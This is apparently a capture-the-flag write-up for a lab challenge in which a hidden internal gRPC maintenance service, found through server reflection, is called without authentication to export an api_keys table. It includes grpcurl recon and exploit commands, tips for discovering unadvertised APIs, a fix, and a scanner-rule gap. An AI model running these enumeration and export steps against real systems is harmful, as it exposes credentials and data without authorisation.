# grpc-2 · Hidden Methods: writeup

**Class:** Exposed internal API discovered through server reflection: missing authentication for a
critical function (CWE-306) and information exposure (CWE-200).

## Recon
```bash
grpcurl -plaintext 127.0.0.1:41202 list
#  grpc.reflection.v1.ServerReflection
#  ops.Maintenance            <- not in catalog.proto
#  shop.Catalog
grpcurl -plaintext 127.0.0.1:41202 describe ops.Maintenance
grpcurl -plaintext 127.0.0.1:41202 describe ops.ExportRequest
```

## Exploit
```bash
grpcurl -plaintext -d '{}' 127.0.0.1:41202 ops.Maintenance/ExportTable
#  INVALID_ARGUMENT: table is required. tables: users, api_keys
grpcurl -plaintext -d '{"table":"api_keys"}' 127.0.0.1:41202 ops.Maintenance/ExportTable
```
`exploit.mjs` does the same in pure Node and is worth reading: it talks the reflection protocol
directly and hand-encodes the protobuf request (`0x0a <len> <bytes>` = field 1, length-delimited).
Knowing the wire format means a missing `.proto` never stops you.

## Why it works
Reflection advertises everything registered on the server, and the internal service was registered
on the same listener as the public one with no auth. "Nobody knows it exists" was the only control.

## Hunting habit
First thing on any gRPC port: `grpcurl -plaintext host:port list`. If reflection is off, look for
`.proto` files in mobile apps, JS bundles (grpc-web), public repos, or brute-force common service
names (`grpc.health.v1.Health` confirms it's gRPC). The same idea elsewhere: GraphQL introspection,
`/swagger.json`, `/actuator`, `/debug/pprof`.

## Fix
Reflection only in development. Internal services on a separate, private listener with mTLS. Every
method authenticates regardless of whether it's "documented".

## Scanner check
**Not caught.** **Rule gap (easy, high-signal):** `new ReflectionService(...).addToServer(...)`
without an environment guard, and admin-looking services (`Admin`, `Maintenance`, `Internal`, `Debug`)
added to the same `grpc.Server` as public ones.
